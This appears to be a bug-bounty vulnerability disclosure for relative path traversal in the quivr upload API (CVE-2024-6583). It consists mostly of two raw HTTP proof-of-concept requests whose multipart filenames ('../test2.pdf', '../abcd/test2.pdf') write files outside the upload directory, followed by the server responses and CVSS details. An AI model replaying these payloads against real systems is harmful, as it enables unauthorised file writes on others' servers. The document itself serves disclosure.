@@ -1,0 +1,105 @@
+Title: Path traversal  in stangirard/quivr
+
+Proof of Concept: 
+POST /upload?brain_id=40ba47d7-51b2-4b2a-9247-89e29619efb0 HTTP/1.1
+Host: localhost:5050
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://localhost:3000/
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhdXRoZW50aWNhdGVkIiwiZXhwIjoxNzE2MzcxMDM0LCJpYXQiOjE3MTYzNjc0MzQsImlzcyI6Imh0dHA6Ly8xMjcuMC4wLjE6NTQzMjEvYXV0aC92MSIsInN1YiI6IjM5NDE4ZTNiLTAyNTgtNDQ1Mi1hZjYwLTdhY2ZjYzEyNjNmZiIsImVtYWlsIjoiYWRtaW5AcXVpdnIuYXBwIiwicGhvbmUiOiIiLCJhcHBfbWV0YWRhdGEiOnsicHJvdmlkZXIiOiJlbWFpbCIsInByb3ZpZGVycyI6WyJlbWFpbCJdfSwidXNlcl9tZXRhZGF0YSI6e30sInJvbGUiOiJhdXRoZW50aWNhdGVkIiwiYWFsIjoiYWFsMSIsImFtciI6W3sibWV0aG9kIjoicGFzc3dvcmQiLCJ0aW1lc3RhbXAiOjE3MTYzNTQwNzd9XSwic2Vzc2lvbl9pZCI6IjNiODhlZTIxLTYwZjYtNDU4Ni05ZjBkLWFlMWQ2NzIyYjI2ZCIsImlzX2Fub255bW91cyI6ZmFsc2V9.s97EkFYaCGE4vSM7TlkHoYHSwLlCYOTu2-jAOuZM0nE
+Content-Type: multipart/form-data; boundary=---------------------------171666158432395266891112786156
+Content-Length: 1459
+Origin: http://localhost:3000
+Connection: close
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+
+-----------------------------171666158432395266891112786156
+Content-Disposition: form-data; name="uploadFile"; filename="../test2.pdf"
+Content-Type: application/pdf
+
+hello world!
+-----------------------------171666158432395266891112786156--
+
+Reponse:
+
+HTTP/1.1 200 OK
+date: Wed, 22 May 2024 09:16:17 GMT
+server: uvicorn
+content-length: 42
+content-type: application/json
+access-control-allow-origin: *
+access-control-allow-credentials: true
+connection: close
+
+{"message":"File processing has started."}
+
+Upload successfully to another directory
+poc1
+
+If upload file to  a directory not exists, it will create a new directory
+
+Request:
+
+POST /upload?brain_id=40ba47d7-51b2-4b2a-9247-89e29619efb0 HTTP/1.1
+Host: localhost:5050
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://localhost:3000/
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhdXRoZW50aWNhdGVkIiwiZXhwIjoxNzE2MzcxMDM0LCJpYXQiOjE3MTYzNjc0MzQsImlzcyI6Imh0dHA6Ly8xMjcuMC4wLjE6NTQzMjEvYXV0aC92MSIsInN1YiI6IjM5NDE4ZTNiLTAyNTgtNDQ1Mi1hZjYwLTdhY2ZjYzEyNjNmZiIsImVtYWlsIjoiYWRtaW5AcXVpdnIuYXBwIiwicGhvbmUiOiIiLCJhcHBfbWV0YWRhdGEiOnsicHJvdmlkZXIiOiJlbWFpbCIsInByb3ZpZGVycyI6WyJlbWFpbCJdfSwidXNlcl9tZXRhZGF0YSI6e30sInJvbGUiOiJhdXRoZW50aWNhdGVkIiwiYWFsIjoiYWFsMSIsImFtciI6W3sibWV0aG9kIjoicGFzc3dvcmQiLCJ0aW1lc3RhbXAiOjE3MTYzNTQwNzd9XSwic2Vzc2lvbl9pZCI6IjNiODhlZTIxLTYwZjYtNDU4Ni05ZjBkLWFlMWQ2NzIyYjI2ZCIsImlzX2Fub255bW91cyI6ZmFsc2V9.s97EkFYaCGE4vSM7TlkHoYHSwLlCYOTu2-jAOuZM0nE
+Content-Type: multipart/form-data; boundary=---------------------------171666158432395266891112786156
+Content-Length: 252
+Origin: http://localhost:3000
+Connection: close
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+
+-----------------------------171666158432395266891112786156
+Content-Disposition: form-data; name="uploadFile"; filename="../abcd/test2.pdf"
+Content-Type: application/pdf
+
+hello world!
+-----------------------------171666158432395266891112786156--
+
+Response:
+
+HTTP/1.1 200 OK
+date: Wed, 22 May 2024 09:33:12 GMT
+server: uvicorn
+content-length: 42
+content-type: application/json
+access-control-allow-origin: *
+access-control-allow-credentials: true
+connection: close
+
+{"message":"File processing has started."}
+
+poc2
+
+Impact: 
+
+
+CVE ID: CVE-2024-6583
+Status: (assigned)
+Vulnerability Type: CWE-23: Relative Path Traversal
+Severity: Medium (4.3)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: Low
+User Interaction: None
+Scope: Unchanged
+Confidentiality: None
+Integrity: Low
+Availability: None
+Registry: Pypi
+Affected Version: Latest
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $75
+Fix Bounty: $18.75
